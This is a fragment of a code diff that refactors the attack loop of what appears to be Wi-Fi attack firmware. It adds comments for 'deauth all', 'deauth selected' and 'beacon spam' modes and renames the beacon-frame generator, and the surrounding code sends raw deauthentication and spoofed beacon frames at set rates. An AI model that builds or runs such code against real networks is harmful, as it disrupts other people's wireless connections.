@@ -131,7 +131,7 @@ String Attack::getResults(){
 void Attack::run(){
   currentMillis = millis();
 
-  if(running[0]){
+  if(running[0]){//deauth all
     if((currentMillis - previousMillis[0]) >= 1000/deauthsPerSecond){
 
       int clientsSelected = 0;
@@ -171,7 +171,7 @@ void Attack::run(){
     }
 
   }
-  if(running[1]){
+  if(running[1]){//deauth selected
     if((currentMillis - previousMillis[1]) >= 1000/deauthsPerSecond){
 
       //send deauth
@@ -207,7 +207,7 @@ void Attack::run(){
 
   }
 
-  if(running[2] || running[3]){
+  if(running[2] || running[3]){//beacon spam
 
     if((currentMillis - previousMillis[3]) >= 1000/beaconPerSecond){
       previousMillis[3] = millis();
@@ -216,7 +216,7 @@ void Attack::run(){
       for(int i=0;i<randomBeacons;i++){
         //unsigned long startTime = millis();
         randomBeaconCounter++;
-        generatePacket();
+        generateBeaconPacket();
 
         if(wifi_send_pkt_freedom(packet, packetSize, 0) == -1){/*
           Serial.print(packetSize);
@@ -238,14 +238,7 @@ void Attack::run(){
   }
 }
 
-void Attack::generatePacket(){/*
-    if(running[0]){
-
-    }
-    if(running[1]){
-
-    }
-    else if(running[2] || running[3]){*/
+void Attack::generateBeaconPacket(){
 
       if(currentMillis - previousRandomBeaconMillis >= randomBeaconChange*1000){
         generate(oldRandomBeacon);
@@ -310,8 +303,6 @@ void Attack::generatePacket(){/*
 
       //set MAC
       for(int i=0;i<6;i++) packet[10+i] = packet[16+i] = beaconMACs[randomBeaconCounter][i];
-
-    //}
 }
 
 void Attack::stopAll(){
